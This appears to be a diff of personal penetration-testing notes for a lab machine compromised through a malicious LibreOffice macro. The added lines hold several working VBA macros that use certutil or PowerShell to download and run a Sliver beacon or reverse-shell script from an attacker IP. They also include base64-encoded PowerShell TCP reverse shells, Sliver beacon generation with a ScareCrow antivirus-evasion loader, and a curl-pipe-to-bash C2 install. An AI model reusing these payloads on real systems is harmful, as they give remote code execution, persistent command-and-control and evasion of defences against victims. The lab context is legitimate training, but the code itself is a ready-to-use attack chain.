@@ -71,7 +71,7 @@ oneminutetopwnagainthen.png
 uploadsdirheader.png
 
 libreoffice_macro_exec.png
-
+173
 
 https://dominicbreuker.com/post/htb_re/
 
@@ -109,7 +109,7 @@ iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
 ```
 
 ```bash
-generate beacon --mtls  192.168.45.173:4445 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G
+generate beacon --mtls  192.168.45.160:8080 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G
 
 
 /opt/ScareCrow/ScareCrow -I /tmp/sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
@@ -118,7 +118,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 
 upx 
 
-mtls -L 192.168.45.173 -l 4445
+mtls -L 192.168.45.160 -l 8080
 ```
 
 Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple PowerShell reverse shell just because it is a CTF so more attempt in one go the better.
@@ -134,16 +134,23 @@ I also may have failed as I also add the event when the application is closed wh
 
 Phind helped with `Call` and `Application.Wait (Now + TimeValue("00:02:00"))`
 
+8080 -sliver
+8844 - p1
+8443 -p2
+
+cybercheffingthelabourfrommyfingers.png
+
+
 Wait two minute for certutil to finish downloading the sliver beacon  
 ```vb
 
 Sub Main
 
-	Shell(cmd /c "certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
-	Shell(cmd /c "powershell.exe -enc ", 0)
-	Shell("powershell.exe -enc ", 0)
+	Shell(cmd /c "certutil.exe -urlcache -split -f 'http://192.168.45.160/Word.exe' 'C:\programdata\Word.exe'")
+	Shell(cmd /c "powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK", 0)
+	Shell("powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK", 0)
 	Application.Wait (Now + TimeValue("00:02:00"))
-	Call Shell(cmd /c "C:\programdata\install.exe", 0)
+	Call Shell(cmd /c "C:\programdata\Word.exe", 0)
 
 Sub End
 ```
@@ -176,6 +183,56 @@ Shell(pathname, windowstyle)
 |**vbNormalNoFocus**|4|Window is restored to its most recent size and position. The currently active window remains active.|
 |**vbMinimizedNoFocus**|6|Window is displayed as an icon. The currently active window remains active.|
 
+
+Read Walk through because at this point the shrugging and sighing while 2023 is at least the most cognisant and spellchecked face-palmable-common-illness-ridden year of my life. More conscious of my idiocy. One day I will be free and master more of this stuff. At least the PrivEsc will be something I can do.
+
+```vb
+
+Sub Main
+
+	Shell("cmd /c certutil.exe -urlcache -split -f 'http://192.168.45.160/Word.exe' 'C:\programdata\Word.exe'")
+	Shell("cmd /c powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK", 0)
+	Shell("powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK", 0)
+	Application.Wait (Now + TimeValue("00:02:00"))
+	Shell("cmd /c C:\programdata\Word.exe")
+
+Sub End
+```
+
+Sub End is the wrong way around
+```vb
+
+Sub Main
+
+	Shell("cmd /c certutil.exe -urlcache -split -f 'http://192.168.45.160/Word.exe' 'C:\programdata\Word.exe'")
+	Shell("cmd /c powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK")
+	Shell("powershell.exe -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4xNjAnLDg0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI-JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc-ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK")
+	Application.Wait (Now + TimeValue("00:02:00"))
+	Shell("cmd /c C:\programdata\Word.exe")
+
+End Sub
+```
+
+Powershell enc does not work, so did EXACTLY as I am told to push square document onto a squareshaped box.
+
+```vb
+Sub Main
+    Shell("cmd /c powershell iwr http://192.168.45.160/rev.ps1 -o C:/Windows/Tasks/rev.ps1")
+    Shell("cmd /c powershell -c C:/Windows/Tasks/rev.ps1")
+End Sub
+```
+
+At least I will enjoy the puns at some point when I database all the trials and tribulations of every machine I have ever hacked. Then I saw this:
+
+wtfisthis.png
+
+I am almost tempted to state that this is a Writeup - that is some serious hammering of nails into you eyes to scratch the inch of needing to doing the PEN200-300 section of the TJNULL list part of my brain. WTF. This is the definition of INSANITY.
+
+insanityisforcingPGmachinestoTrawlYOURPHISH.png
+
+https://www.youtube.com/watch?v=Qjd8HobrTzA
+
+If I do get access to this machine I will change to a writeup if I do the privesc unassisted.
 
 
 ssh server for Linux and securing it 
@@ -331,6 +388,13 @@ apt install mingw-w64-x86-64-dev gcc-mingw-w64-x86-64 gcc-mingw-w64 -y
 curl https://sliver.sh/install| bash
 wait
 # Sliver configuration
+
+# su to team-server-admin 
+
+systemctl enable sliver
+systemctl start sliver
+systemctl status sliver
+
 
 ```
 https://www.linuxteck.com/install-and-secure-ssh-server-in-linux/
